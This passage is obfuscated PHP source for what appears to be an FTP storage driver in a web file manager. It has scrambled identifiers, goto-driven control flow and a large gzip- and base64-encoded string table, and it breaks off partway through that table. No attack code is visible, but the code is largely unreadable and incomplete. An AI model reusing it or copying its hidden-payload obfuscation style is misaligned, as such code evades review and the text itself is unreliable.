$_SERVER[úÉ·öƒÑì©]; if (!$this->_isconn()) { return !1; } $a¯ÏÎ¬ÄêÓ = $f¨ƒÈ¨­÷Ğ = array(); goto d«±†Ú£; A¬›êˆ›¤: } public function getContent($DñÄ‡é¸›å) { if (!$this->_isconn()) { return !1; } $DñÄ‡é¸›å = $this->iconvSystem($DñÄ‡é¸›å); return $this->fileSubstr($DñÄ‡é¸›å); } public function setContent($F¡ ™¼«´, $DğÊ…ÏÚÌ‚ = '') { goto FĞôùÀßŸ³; CãÉ‹Ì»çÒ: file_put_contents($C¤ˆçãë×Ç, $DğÊ…ÏÚÌ‚); $e¸®¨Îã–ò = $this->upload($F¡ ™¼«´, $this->iconvApp($C¤ˆçãë×Ç)); $this->tempFileRemve($C¤ˆçãë×Ç); goto e²Ñã„”²¸; e²Ñã„”²¸: return $e¸®¨Îã–ò; goto cÚè‹º³Î‚; FĞôùÀßŸ³: if (!$this->_isconn()) { return !1; } $E·‡„Â„¶ = $this->pathThis($this->iconvSystem($F¡ ™¼«´)); $C¤ˆçãë×Ç = $this->tempFile($E·‡„Â„¶); goto CãÉ‹Ì»çÒ; cÚè‹º³Î‚: } public function fileSubstr($E­‚‚ƒŸ, $E¤ÚÏ”Í‚ = 0, $cÁêğ·½ÁÏ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($E­‚‚ƒŸ, $E¤ÚÏ”Í‚, $cÁêğ·½ÁÏ); } private function ftpRequest($f½ºááÁÓ, $d×İæáå°† = 0, $fó¤Š÷¼Üù = false) { goto DøÜÊ•Ó ; DøÜÊ•Ó : $f½ºááÁÓ = $this->iconvSystem($f½ºááÁÓ); $aÈ¡°ÇÄÑ• = $this->scheme . $this->host . $_SERVER[úÉ·öƒÑì©][4] . $this->port; $B°´ˆÑ·÷ = curl_init(); goto aØâ¬Î×ñù; aØâ¬Î×ñù: curl_setopt($B°´ˆÑ·÷, CURLOPT_URL, $aÈ¡°ÇÄÑ• . $this->pathEncode($f½ºááÁÓ)); curl_setopt($B°´ˆÑ·÷, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($fó¤Š÷¼Üù) { $E¹‚ Ú¥Šº = $d×İæáå°† + $fó¤Š÷¼Üù - 1; curl_setopt($B°´ˆÑ·÷, CURLOPT_RANGE, "{$d×İæáå°†}\55{$E¹‚ Ú¥Šº}"); } goto e®ƒ×‹ì¹; CŞÈãÜñ…: return $f–‚ ’—´½; goto D¾™ÙĞ´å; e®ƒ×‹ì¹: curl_setopt($B°´ˆÑ·÷, CURLOPT_RETURNTRANSFER, 1); $f–‚ ’—´½ = curl_exec($B°´ˆÑ·÷); curl_close($B°´ˆÑ·÷); goto CŞÈãÜñ…; D¾™ÙĞ´å: } public function upload($EÄ˜™›ˆÔ›, $bô†ìÍá¡, $FÃ¬Šµ…ëß = false, $cÑ’“Ûçá = REPEAT_REPLACE) { goto d‘ã›™Ï“¸; bâö¨œÆ¶¯: if ($aİ¾ìàğ¿„ != FTP_FINISHED) { return !1; } return $this->getPathOuter($EÄ˜™›ˆÔ›); goto F®İÒ«ÃŸĞ; d‘ã›™Ï“¸: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($EÄ˜™›ˆÔ›))) { return !1; } $EÄ˜™›ˆÔ› = $this->iconvSystem($EÄ˜™›ˆÔ›); goto CÖƒ´ŞÔî¨; CÖƒ´ŞÔî¨: $bô†ìÍá¡ = $this->iconvSystem($bô†ìÍá¡); $aİ¾ìàğ¿„ = ftp_nb_put($this->connect, $EÄ˜™›ˆÔ›, $bô†ìÍá¡, FTP_BINARY); while ($aİ¾ìàğ¿„ == FTP_MOREDATA) { $aİ¾ìàğ¿„ = ftp_nb_continue($this->connect); } goto bâö¨œÆ¶¯; F®İÒ«ÃŸĞ: } public function download($D²”æù¬©­, $cÂ´Õ‚·î¾ = '') { goto b¦¾ˆÑ§œ; b¦¾ˆÑ§œ: if (!$this->_isconn()) { return !1; } $F¡„–Ç‚àÃ = $this->pathFather($cÂ´Õ‚·î¾); if (!IO::mkdir($F¡„–Ç‚àÃ)) { return !1; } goto fÚêÚßîÎÏ; fÚêÚßîÎÏ: $D²”æù¬©­ = $this->iconvSystem($D²”æù¬©­); $cÂ´Õ‚·î¾ = $this->iconvSystem($cÂ´Õ‚·î¾); $fßó›ğ‹“ = ftp_nb_get($this->connect, $cÂ´Õ‚·î¾, $D²”æù¬©­, FTP_BINARY); goto Fçµì¶ó÷Â; Fçµì¶ó÷Â: while ($fßó›ğ‹“ == FTP_MOREDATA) { $fßó›ğ‹“ = ftp_nb_continue($this->connect); } if ($fßó›ğ‹“ != FTP_FINISHED) { return !1; } return $this->iconvApp($cÂ´Õ‚·î¾); goto EÙ›Ù‰ «; EÙ›Ù‰ «: } public function exist($d…Ö¦¤ñÖ¿) { return $this->isFile($d…Ö¦¤ñÖ¿) || $this->isFolder($d…Ö¦¤ñÖ¿); } public function isFile($EĞãĞ×Á¬‘) { return !$this->isFolder($EĞãĞ×Á¬‘) && $this->objectMeta($EĞãĞ×Á¬‘); } public function isFolder($DáÆ­²Î’) { return $this->cacheMethod($_SERVER[úÉ·öƒÑì©][199], $DáÆ­²Î’); } protected function objectMeta($CØË¤Ôè‹) { return $this->cacheMethod($_SERVER[úÉ·öƒÑì©][200], $CØË¤Ôè‹); } protected function _objectMeta($Bá¥½î¸„) { goto C­­ª“¤–¨; C­­ª“¤–¨: $FôààĞ¼Æ =& $_SERVER[úÉ·öƒÑì©]; if ($Bá¥½î¸„ == $FôààĞ¼Æ[33] || $Bá¥½î¸„ == $FôààĞ¼Æ[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto f¼à¶‘¹˜æ; f¼à¶‘¹˜æ: $Bá¥½î¸„ = $this->iconvSystem($Bá¥½î¸„); $bøß‘›¯ˆ¾ = array($FôààĞ¼Æ[28] => $this->iconvApp($Bá¥½î¸„), $FôààĞ¼Æ[29] => $FôààĞ¼Æ[193], $FôààĞ¼Æ[78] => 0); @ftp_chdir($this->connect, $FôààĞ¼Æ[8]); goto eò‘‹…Ş”¥; eò‘‹…Ş”¥: $F¥ì£Ù˜ = @ftp_size($this->connect, $Bá¥½î¸„); if ($F¥ì£Ù˜ != -1) { $bøß‘›¯ˆ¾[$FôààĞ¼Æ[78]] = $F¥ì£Ù˜; } else { $CÂçŒ„†Œ™ = @ftp_chdir($this->connect, $Bá¥½î¸„); if (!$CÂçŒ„†Œ™) { return !1; } $bøß‘›¯ˆ¾[$FôààĞ¼Æ[29]] = $FôààĞ¼Æ[77]; } return $bøß‘›¯ˆ¾; goto DÓ‹äÂç­Û; DÓ‹äÂç­Û: } protected function _isFolder($bßÄ¦‰ƒ½) { $D†…ÒÁ‡ÉÕ =& $_SERVER[úÉ·öƒÑì©]; if ($bßÄ¦‰ƒ½ == $D†…ÒÁ‡ÉÕ[33] || $bßÄ¦‰ƒ½ == $D†…ÒÁ‡ÉÕ[8]) { return !0; } $Fç¸³ö–¹ = $this->_objectMeta($bßÄ¦‰ƒ½); return isset($Fç¸³ö–¹[$D†…ÒÁ‡ÉÕ[29]]) && $Fç¸³ö–¹[$D†…ÒÁ‡ÉÕ[29]] == $D†…ÒÁ‡ÉÕ[77] ? !0 : !1; } } goto FéÕœ¥•‹¬; d¡Å•©âšñ: if (!function_exists('_kodDe')) { function _kodDe($e®ùÔöœ²¾) { $e®ùÔöœ²¾ = base64_decode($e®ùÔöœ²¾); $AÑˆó¦©Ñİ = strlen($e®ùÔöœ²¾); $bƒ¤”‚ôÊ› = ''; $e¸©ô“øÁğ = ord($e®ùÔöœ²¾[0]) - 30; for ($AÉ‰¤¬’Œ– = 1; $AÉ‰¤¬’Œ– < $AÑˆó¦©Ñİ; $AÉ‰¤¬’Œ– += 2) { if ($AÉ‰¤¬’Œ– + 1 < $AÑˆó¦©Ñİ) { $bƒ¤”‚ôÊ› .= chr(ord($e®ùÔöœ²¾[$AÉ‰¤¬’Œ– + 1]) + $e¸©ô“øÁğ); $bƒ¤”‚ôÊ› .= chr(ord($e®ùÔöœ²¾[$AÉ‰¤¬’Œ–]) + $e¸©ô“øÁğ); } else { $bƒ¤”‚ôÊ› .= chr(ord($e®ùÔöœ²¾[$AÉ‰¤¬’Œ–]) + $e¸©ô“øÁğ); } } return $bƒ¤”‚ôÊ›; } } define("\372\311\267\366\203\321\354\251", "\200"); $_SERVER[úÉ·öƒÑì©] = explode(base64_decode('fAR8AnwE'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\175\11\174\24\105\366\260\256\307\212\267\256\250\250\273\264\1\114\2\163\44\341\10\4\102\230\44\223\144\144\222\211\63\23\2".base64_decode('kjD0zHQyncxMT7p7cgHegsohqOuqqLvisR4IIi6rKOstKq43yup6LAh4/HE9UQ==')."\144\325\257\356\252\356\231\270\377\357\367\175\50\114\327\253\273\352\325\253\367\136\275\172\365\303\201\325\367\277\265\146\337\305\377\131\170\370\302\137\55\74\374\242\175\313"."\360\7\370\357\120\364\13\376\216\134\172\324\41\350\317\141\113\257\52\52\152\230\164\364\270\246\143\257\176\350\176\371\36\171\255\174\125\300\277\355\45\337\161\57\257\75"."\xd7\xbb\xe7\xf6\x6d\x3\x7b\xe\x3d\xe4\xcb\x5d\xcd\xef\x57\x80\xc4\x38\x6f\x5\xfe\x91\xd2\x9a\x29\x29\xfd\xaa\x61\x1a\x18\x10\xd3\xd2\x1d\x6a\x27\xfe\x56\xd3\xf8\xd7\x8d\x7f\x8c\x9e".base64_decode('pGoq+DvSFAhHQi3Nzd5gOEJKFONTWpx8ZWRdTpHCM4pugKrE4iIZLaOkLRAOiA==')."\313\246\34\225\15\122\122\155\165\244\326\333\354\17\314\211\204\347\64\173\111\212\150\244\47\253\350\3\70\204\76\103\246\254\233\141\65\245\260\24\175\72\153\127\265\267".strrev('hwMDJ’û@‘èßSĞsLnff§µ~…ÎÑ± Mpa4ì&§¦ƒ…$×Ş')."\105\322\174\34\63\137\52\306\37\165\252\222\214\343\317\264\114\233\143\16\144\310\127\230\175\201\71\110\147\223\111\34\150\142\137\244\375\112\207\234\115\222\61\253\25\3"."\31\135\115\311\264\353\63\225\1\6\305\37\162\326\324\324\164\14\7\274\375\246\56\163\70\150\161\114\127\122\112\232\24\25\362\372\275\65\141\11\66\123\252\13\6\32"."\x25\x32\x15\x29\xd9\x30\x15\x5d\x6a\x6d\xf0\x6\xbd\x12\x6c\x7a\x65\x21\xea\x71\xa1\x84\xf3\xb5\x34\x81\x1\x91\x3c\x7e\xbf\x34\x54\x9\xa6\x92\xca\xd0\x62\x70\x9e\x3c\x85\x5\x82\xb5"."\336\240\124\75\107\342\343\24\323\122\51\55\355\2\245\200\371\64\205\246\172\203\101\374\341\40\30\354\367\301\251\43\201\100\135\135\310\313\102\244\163\347\371\101\113\306".strrev('ù8”B…jid|‡+cM¤¬‚Y«MG¸Aš¿!ù!oñ»Y³\'+Ò3Iâ„µ,')."\x48\x81\xfc\x1a\x59\x5c\x60\xa5\xf5\xe2\xcf\xca\xe9\xf8\x77\x2a\x49\x14\x8d\xc0\x38\x45\x37\x23\x4a\x3a\xa6\xc5\xd5\x34\x59\x8f\x55\x64\xed\x11\xc\x94\xcd\x44\xad\xae\x82\x74\xa4\x40"."\315\25\323\62\3\215\132\57\351\114\207\232\124\374\154\271\165\150\311\270\242\363\160\6\144\27\143\110\257\324\101\41\167\123\66\45\46\141\301\130\102\115\306\165\272\112"."\x7f\x29\x25\xa0\x3\x6a\xc7\x0\x5f\x8d\x86\x96\xd5\x63\x8a\xf\xac\x17\x9e\xb7\x99\xb5\xa4\x94\x24\x52\x4c\x13\x74\xda\xa0\xfd\x6a\xc9\x24\x35\x39\x1e\x52\x74\xa1\xaf\x75\x20\x63\x20"."\153\212\300\54\112\126\247\351\251\132\100\67\110\375\140\265\250\55\171\42\272\351\172\211\13\103\350\42\364\256\150\356\305\316\237\332\347\316\0\377\24\23\342\327\106\232"."\226\120\222\311\210\322\257\220\165\225\212\117\64\150\137\335\106\124\115\273\1\4\7\175\201\110\102\66\22\215\361\211\21\224\213\322\324\270\322\357\312\44\62\144\351\263"."\xd5\xde\x66\xc1\x7b\x38\x3b\x4d\x9a\xe9\x15\x28\x73\x52\x8b\xc9\x49\xb1\xa7\xf8\x3b\x61\x9a\x99\x90\x92\x8e\xc3\x1\x21\x3d\xd2\xfa\xd2\x68\xc0\x32\x8a\x42\x12\xd5\x3a\xa4\xb8\xd4\x28"."\315\221\32\52\324\12\203\146\114\45\331\27\355\35\203\31\14\150\366\23\214\51\40\141\245\337\44\203\42\115\215\45\144\35\114\127\145\326\354\160\116\46\364\45\223\111"."\252\61\331\124\265\264\133\213\231\212\351\64\114\135\221\111\151\236\130\114\61\14\147\215\226\66\165\55\351\364\44\223\132\237\63\240\253\235\152\272\102\32\113\250\61\210"."\4\353\335\11\51\144\5\131\304\5\123\45\210\53\220\100\214\305\265\321\305\311\122\353\162\332\350\120\164\247\227\54\232\12\11\314\7\43\220\64\131\255\152\144\64\103"."\205\315\253\220\144\323\224\143\11\110\134\170\361\225\277\220\136\115\47\325\264\222\223\326\333\237\121\165\305\240\155\225\352\33\303\244\20\120\272\342\154\326\345\316\224\134"."\x21\x65\xb2\x51\x30\x32\x64\xf5\xe6\x81\xe1\xd4\x64\x68\x2a\xa4\x18\xc\x3a\xa4\x54\xd6\x30\x9d\xba\x2\xa8\x94\xa\xf6\x43\x32\xc7\xbe\xe\x67\x23\x5c\x5a\xaa\x12\x77\x86\x0\x31\x27".base64_decode('4PElEySANhKNw9CGcLg54qsDe3aTN9LoCdc0kGabcidtsx+QaFYkBc52giUGEQ==')."\253\11\364\225\3\233\265\76\105\7\25\127\17\124\110\335\132\74\252\365\273\150\24\114\34\2\64\204\46\206\323\235\61\235\101\71\335\11\307\47\72\140\52\4\375\214"."\336\116\353\100\373\225\164\247\231\240\31\103\336\340\54\157\60\22\12\324\205\133\75\101\262\333\247\1\226\364\323\252\140\321\111\147\120\211\203\241\217\231\64\237\234\201".base64_decode('o0bTwIUB54rGwsVC4/y+ejgwtU4DJHKKqWjZfjWlwrabLAaNJGAF6kmD3KhDlQ==').base64_decode('bYmxRW3xccVO8O/Y4rltta6x7VVuledxl7pKpbKSSVIz4E1UOSmRTuekKJECMw==').base64_decode('f2EA4NYlLGvb0GFg0HteizcUjjR6ww2BWlKD10O+/BpemrRHc/FPu4vTYzDnvg==').base64_decode('lNxpo9Iw1KjpihXCd41WNU7JOAw2KGpngvRPhaXFtKSmy0lIxSgSK5SydKodZA==')."\176\60\301\344\201\220\232\312\120\272\146\46\262\251\250\360\111\331\122\60\337\164\173\111\150\154\173\323\164\362\125\341\46\11\307\224\325\121\312\354\16\215\7\377\163\62".strrev('I\\emk,¤Ú:’dhLÅF’KuB'."\r".'MÔÒıó"ƒLKXĞa&˜âRIvå2R×')."\x2a\x74\x34\x12\xa\x25\xe9\x25\x24\x19\xd8\x99\xd8\x58\x75\x30\xf2\xe\x18\x37\x0\xe5\x5b\xaa\x6a\x4\x41\x4e\xc8\x48\xd1\x70\x2b\xe4\x77\x39\xc0\x64\x49\x93\x60\x37\x9\x44\xbb\xc0"."\162\41\234\204\152\324\11\233\177\104\103\161\240\361\62\117\337\254\53\35\52\131\164\151\60\143\215\262\336\115\63\200\31\342\333\16\14\10\205\325\265\370\375\221\232\100"."\123\30\360\320\30\322\32\364\205\275\24\107\75\265\21\117\115\63\333\104\371\214\223\4\220\140\344\356\6\30\322\133\46\354\104\174\313\342\304\234\156\265\220\130\343\157"."\x40\x9d\x33\x5a\xda\x50\x9c\x31\x52\x5a\x9c\x93\x75\x9c\x62\xaa\x8d\xa6\xe7\xe4\xe0\x9c\x7b\xbf\x53\x4e\xd\x3a\x53\x60\x98\x9c\xac\xe9\xd6\x1d\x56\xa\x8b\x1b\xb5\x8f\xcc\x2b\x27\xdf"."\x70\x60\x81\x60\x44\xb7\xf6\xe6\x40\x88\x64\xa8\x82\x50\xc0\x3d\x45\x15\x9d\xb4\xa3\xb9\x85\x44\xa5\x4\x9c\xaa\xf7\x12\xe0\xd1\x74\xb7\x96\x9\xef\xe4\x69\xd\x51\xd2\x9b\x5\xe9\x75"."\165\120\346\175\254\242\355\41\145\367\247\222\234\41\264\366\312\311\347\42\334\340\153\232\31\151\14\324\172\375\21\137\23\240\113\341\134\170\113\163\255\207\116\256\10\257"."\16\204\33\54\320\26\100\231\146\171\374\76\173\162\357\154\137\50\34\312\33\5\140\55\136\133\114\104\346\13\2\176\161\276\25\307\300\75\310\47\360\247\21\260\12\43".strrev('wX”&d	‚’”WP…C!ºu€½·ğe¸mŞ#n-ğ6‡³Hš¾B{W É&d')."\104\216\2\52\103\211\161\26\242\33\221\37\200\250\332\34\364\326\371\146\263\140\235\317\353\257\15\105\152\74\65\15\136\6\154\362\64\322\376\164\100\141\321\160\133\323"."\107\300\16\20\142\42\147\244\27\212\317\164\56\43\26\371\56\102\45\227\10\107\123\260\233\53\144\151\220\331\200\102\73\32\150\42\102\304\264\54\135\54\214\213\115\321"."\x9e\xa6\x64\xb2\xea\x65\xba\x53\x17\xe1\x9f\x62\xc9\x13\x92\xcc\x4c\x84\x91\xb7\xe8\x0\xfb\x44\xdd\xa0\x61\xc0\xaf\x92\xfa\x25\xb2\x1b\xe5\xb4\x20\x2\xd3\x54\x2b\x1d\x6c\x63\xc9\xf"."\360\164\230\214\110\331\302\140\166\171\34\100\20\17\322\16\0\104\105\10\23\241\244\300\0\342\224\207\66\247\203\113\346\221\100\263\67\350\201\162\175\244\65\30\150\252"."\47\31\372\22\12\155\200\217\14\177\21\345\356\210\170\157\162\12\13\130\63\231\112\170\174\320\273\64\72\224\13\361\317\71\370\7\340\22\251\134\111\323\121\217\302\315"."\x86\xd1\x2d\x2a\xb2\x81\xc5\x4a\x37\xa\x2d\xcb\x6a\x8b\x6a\x5a\x92\x92\x11\xc0\xa0\x30\x72\xc5\x14\x3\x5d\x6\x45\x92\x7e\x4a\x1b\xc7\x91\xa\xfb\xc9\x86\x17\xe\xcc\xf4\x36\x45\x28"."\x66\xe1\x90\x80\x8d\x18\x0\x44\xed\x40\x90\xc\x88\xa9\x75\x53\x79\xf\x47\x6\xbd\x21\x4a\x84\x74\xa5\x27\xab\xd2\xe1\x72\xbb\xc6\x11\x2c\x56\xc0\x9e\x4a\xaa\x77\xcf\x6b\xeb\x1b\x57".base64_decode('NNc5ztUOPorHzsBBEmpzWYKjSf6sznJDvq3IqCquaHO3uYuqKuZ6nIOyc7DEOQ==').strrev('¶¨×6ìî1X^ÖÛ˜Ïæœó›Lj­²§àíQªÂ@	‚,&9”Ú'."\0".'<UÍ®>ÙÅ')."\276\366\261\305\125\264\236\130\126\7\262\154\154\200\65\65\76\256\10\64\11\360\163\54\111\32\121\144\41\1\215\30\124\63\34\272\140\322\42\12\7\163\250\164\362\34".strrev('[4ÎÔB1ÊˆºáÜN1Ód~	î¸VXÏaóÎ<é`öÀåà^È|„«Úãms')."\102\200\111\141\72\4\253\30\261\140\14\376\135\104\47\262\123\351\247\244\41\335\241\352\51\112\332\324\36\252\42\111\53\75\344\103\63\51\176\107\25\263\117\241\350\1"."\340\226\60\100\16\52\267\202\50\41\224\104\134\53\251\201\313\217\12\22\246\110\57\62\21\310\62\366\261\120\134\111\223\171\32\106\122\33\61\71\243\204\204\36\106\42"."\141\117\265\337\33\241\24\206\120\142\32\106\124\261\232\51\25\101\327\70\105\245\364\41\306\145\10\44\56\221\225\157\364\44\45\104\30\44\105\327\65\275\2\51\117\215"."\x6c\x6\xf2\x9a\x40\x34\x34\xc1\xd8\x4a\xdd\xca\x80\x54\x39\x5d\xc2\x43\x4e\xf2\x45\xc4\x9\xc8\xc8\x94\xb1\x81\xa2\x3e\x63\x56\xdc\x45\x6d\x6d\xd9\xb9\x4a\xbc\x7d\x2e\x40\x6a\xd9\xd9".base64_decode('0b5g/KJiKkK428AfGsC0jLQ+w+fSALwkZew8eXR8EUYNI4B9cMF2MDWNJcCicQ==')."\120\323\31\117\227\261\110\5\246\146\312\111\113\21\141\10\241\244\211\362\25\104\243\201\147\333\317\51\26\344\64\4\25\51\42\247\115\114\377\307\364\63\202\166\16\346"."\10\51\246\213\245\160\10\221\370\337\312\2\112\341\323\140\15\325\10\373\33\326\51\205\6\14\123\111\131\324\250\206\2\67\374\272\154\62\151\62\201\44\251\166\223\142"."\xc9\x2\x99\x9f\x2f\x6d\x9d\xa6\x53\xc1\x7b\x2c\xa9\xb7\x60\x6c\xbe\x84\xbe\x74\x1a\x88\xc9\x22\x42\xf1\xad\xb4\xde\x3\x78\xaa\xb0\x54\x44\x55\x8e\x92\xaf\x49\xaa\xe\x4\xfc\x5e\x4f"."\223\4\167\155\262\333\370\152\235\64\377\154\247\217\10\163\354\103\215\323\111\0\224\314\244\120\242\154\43\41\310\333\72\240\136\311\1\131\4\7\150\226\3\162\115\16"."\56\117\70\270\266\316\301\270\171\7\141\362\35\246\254\203\15\36\162\341\344\323\127\353\120\215\132\44\301\240\162\121\24\155\207\231\200\212\223\244\74\340\300\155\362\53"."\275\112\322\101\133\344\240\15\165\120\11\304\201\44\312\132\322\232\26\200\342\244\65\350\23\320\274\204\3\116\77\304\76\7\127\42\222\352\4\221\307\301\305\41\107\247"."\256\145\63\315\264\46\41\204\33\103\0\274\245\14\20\324\64\323\101\105\134\107\256\364\233\177\310\362\67\35\215\261\275\156\62\77\60\52\167\110\362\227\236\73\346\126"."\341\155\1\56\210\50\1\26\321\175\310\222\206\117\41\135\45\111\205\207\340\40\363\257\131\174\151\301\176\324\311\275\42\122\345\103\60\272\33\120\144\344\312\174\256\153".base64_decode('5typXYy1a4phpWG5MyRUZ8qdtK48sfg7qMQGYlwUrhUEbGuIjTtaF/mQO/98Mg==')."\204\145\363\160\364\260\141\164\40\51\26\263\271\264\40\377\220\253\215\367\51\220\341\33\72\44\241\41\260\265\10\104\222\202\2\234\46\147\11\3\42\33\104\24\200\352".base64_decode('X/KlUBjvijjYqD92AB0dS70wyBGFDoEEK3AIWyZcJU4+5UKQ/KhaBI97JMWUDA==')."\x6c\x22\x6c\x4\x1d\xce\x4b\xb3\x9a\x1e\x50\xd3\xa2\x12\x88\x43\xf9\x9e\xc0\xb7\x24\x88\xb8\x36\xb5\x55\xed\x50\xdf\x98\x16\x72\x25\x93\x83\x28\x9f\x1c\x50\x8c\x13\x76\xe\xae\xe1\x0"."\xad\x47\xb2\x24\x6f\x3b\x29\xc9\xd6\x72\x4a\x30\x48\xa7\x5b\x80\xc8\x1c\xb1\x21\x2e\x41\xd9\x84\xac\xf3\x31\xa5\x2b\xc\xa2\x39\x57\xad\xc1\x24\x3c\x28\x24\xeb\x90\x7b\xf9\x76\x69\xc9"."\43\254\23\303\34\240\255\27\77\255\205\342\140\355\120\201\6\246\11\310\27\24\227\240\152\370\231\10\154\375\106\75\15\153\171\203\120\77\105\277\65\204\377\364\270\330"."\xb2\x9b\x21\x61\xb5\x88\xc2\xc8\xb6\x18\x11\x44\x58\xb6\x32\xad\xf9\x70\x3\x3d\x8c\xb8\x1\xfe\x32\x9\x28\xb9\xee\x82\x8b\xa9\x1e\x12\x66\x91\x38\x32\x62\x66\xc0\x4d\x0\x7f\xb\x89".base64_decode('MnYabtljckC5CdluY4PagrxyC50iWJ7JKOk4TCIsNkuxVOUpx4E479IxTXQBXg==')."\220\34\136\72\112\204\215\232\57\354\5\6\142\217\10\15\135\144\33\57\23\310\235\121\131\167\351\240\142\336\144\116\63\10\243\227\145\200\166\322\3\124\150\276\34\70"."\306\257\121\241\5\56\34\157\134\65\41\4\322\105\215\152\114\171\102\341\50\221\301\104\262\5\7\313\225\63\113\234\237\163\214\261\244\314\267\47\270\306\42\62\356\342"."\xbb\x96\xb8\xe7\x89\xa7\xa5\xf0\xbc\x15\x7f\x9\x26\x6\x29\x76\x0\x8b\x80\x2e\xc3\xd4\x32\x3c\x46\x8\xe2\x68\x21\x8a\x17\x2a\xa4\x62\xc3\x8f\xda\x4\xe8\x78\x1c\xf1\x3a\x7c\xd0\x50"."\x5a\x92\x17\x9\x37\x18\xe1\x5d\x49\x90\x42\xd0\xea\xfb\x6a\x3d\xba\x4e\xf1\x3\x77\x8\x2a\x7a\x1\x50\x4\xc1\xc5\x1d\xa2\xa\xeb\x7c\xd4\x1a\x17\xee\xed\xe5\xa6\x3\xb8\x28\x58\xb1"."\13\157\63\56\71\36\17\120\305\253\370\235\233\124\124\364\344\57\10\131\163\260\242\204\120\376\344\236\144\222\237\361\332\303\103\146\301\213\125\314\44\102\206\314\126\207"."\204\14\252\377\313\7\143\374\251\310\205\131\271\56\256\271\264\163\147\126\202\64\364\26\76\4\145\342\23\232\77\14\266\273\232\204\232\126\14\266\153\351\106\236\36\103"."\xcc\x1c\x6a\x9a\x60\x9c\xa0\x8a\x3\xd2\x26\x0\x88\x1b\x2\xd3\x37\x71\xa2\x20\xec\x79\x68\xff\x88\x98\x96\xdd\x3a\x88\xca\x10\x50\xd5\x32\xfa\x60\x69\xe0\x91\xac\xd3\xb5\x94\x2f\x0"."\120\77\77\76\330\323\51\124\343\206\50\114\277\232\257\243\140\376\340\126\77\124\231\64\232\25\305\371\202\225\53\126\277\200\277\166\76\117\350\115\254\167\40\232\42\11".base64_decode('wd9DFx6Gv7nJ1uWzF2nvPjdi6yb3NX8bcU9r8TV3v50dMfazZ68fNXfT6Knq5g==')."\xc5\x93\xaf\xa9\x5f\x75\xea\xb\xb7\x3f\x7f\xfb\x98\x81\x3\x85\x3b\xde\xba\xeb\x42\xf3\xe3\x7\x8e\x9f\xbd\xe4\xb8\xb9\x1b\xe\x3d\xf3\x81\xbf\x14\x3f\xb0\xe6\xd9\xf3\xff\xe7\xdd\x97".base64_decode('Nhx09n5U2Td63+Zjln3x+SOP7r31u719T4374OwjL/jPj1s/WPCfSwt+fvWJ3g==')."\x3\x45\xd3\x8e\x39\x75\x7b\xc5\xba\xd5\x8d\x77\x3e\x59\x3c\x7e\x49\xe2\xf9\x11\xbb\xbc\x97\xd5\x9c\xff\xe6\x3\xbe\x5f\x4d\x5e\x58\x37\xed\xfe\x79\xb3\x3e\xbd\xff\xa6\xbb\x9e\x50\xcf".base64_decode('aN65cszx35914KfJX32/o2/NjbecuW3MTz97Op4edtKo305Zccblk5v//vwbUw==')."\122\113\126\76\162\312\302\111\277\371\353\356\313\272\77\173\363\234\171\113\156\131\354\215\7\67\234\127\270\252\336\363\324\25\327\314\170\176\325\360\326\177\136\70\341\167"."\107\356\30\163\312\314\343\176\173\354\114\371\216\15\305\147\35\367\253\207\146\325\154\175\253\347\372\17\167\316\137\34\252\33\175\115\331\216\364\163\307\355\172\377\137\347"."\151\145\55\127\77\167\130\323\303\261\5\107\316\33\276\150\333\343\243\376\375\373\276\15\236\17\257\75\321\77\342\303\33\77\55\270\167\356\275\157\176\373\362\334\73\253".base64_decode('jxn+8juXL6nacvvftgyb9uGuUPndZy6/PvrpxKaejmMeXfvx8DZX+ZRnn7hr3w==')."\xc5\x99\x5\xb7\xbb\x46\xfa\xef\x9a\xff\x4e\x53\xc5\xe9\xcb\xf6\x1f\xe8\x5f\x30\xf9\x9d\xae\x13\xb6\x3b\x8a\x3b\xdf\x9d\xaf\x4e\xde\xdd\xf5\xc8\x3f\x5f\x9f\x79\xe2\xec\x99\x7\x4f\x59".strrev('îc±ô¼k8Ù˜œænÍã}:<_ÛµöãNÚñqÓ|ïÃ™ğºĞûÖ³øeºF}')."\11\337\350\163\356\233\164\342\27\75\227\144\132\356\271\175\363\135\363\237\51\356\71\144\170\40\365\230\343\344\252\25\113\113\116\33\367\257\63\76\331\174\317\366\261\73"."\22\361\375\123\57\173\166\327\350\327\263\147\135\262\341\225\151\357\156\377\266\343\267\345\17\254\132\376\121\301\317\307\356\133\271\77\125\377\303\15\67\116\274\127\332\270"."\xd8\xdf\xbe\xeb\xba\xcf\x2f\xbe\xf4\xad\xc9\x1f\xde\x36\xef\x99\xcd\xde\xde\x8b\xb3\xf\x64\x5a\x9d\x77\x6\x9f\x9b\xad\x5d\xfc\xde\x9c\xfe\x8b\x6a\xa\x3f\x5b\x19\xed\xbb\xee\x8a\xe3"."\327\226\16\177\160\353\314\203\317\77\373\217\201\323\226\254\34\367\273\347\352\266\76\365\303\143\243\156\157\74\341\260\257\245\371\147\337\177\330\11\43\57\377\327\65\207"."\77\67\131\237\277\164\351\226\53\256\366\257\76\342\375\103\322\355\17\236\370\365\153\307\236\160\345\113\141\117\264\374\345\342\57\67\116\214\375\151\357\135\277\225\275\323".base64_decode('37vNldhacMOIFVdvWJrs3Lzfe+qIdfsanY6HVm845autl70als+YP+0rpen8og==')."\x27\x42\xf\x2e\x79\xf7\xf8\xfb\x6a\x42\x9b\xae\x9f\x32\xd9\xbb\xf1\x32\xc7\x43\x77\xbd\xb5\x22\x75\xfa\xce\xbb\x97\xfc\xa1\xfe\xa5\x7d\x8b\x76\x9e\xfe\xd4\xc5\x33\xba\xe\x5e\x70\xc6"."\153\43\336\73\256\266\347\217\207\73\16\316\157\272\376\326\232\225\137\276\272\177\352\212\345\133\76\373\350\266\175\357\134\162\306\237\346\234\66\153\135\150\307\373\237\75"."\363\222\372\371\236\322\267\336\336\174\155\113\325\314\317\47\237\176\345\65\362\252\61\113\375\323\36\332\62\160\353\203\235\157\226\135\277\364\355\361\347\134\63\241\170\305"."\x1d\x67\xcd\x78\x69\xf4\xa3\xb\xd6\x5\xde\xfe\xe0\xb9\x8e\xa9\xe9\x33\x5a\xf\x9b\x98\x75\xff\xb9\x74\xe9\x35\xf7\x7d\x5d\x39\xe2\xa2\x8a\x2f\xfd\xb\x8e\xfc\xec\x86\xe0\xbb\xab\x1b"."\245\347\32\117\231\62\345\363\205\307\26\337\7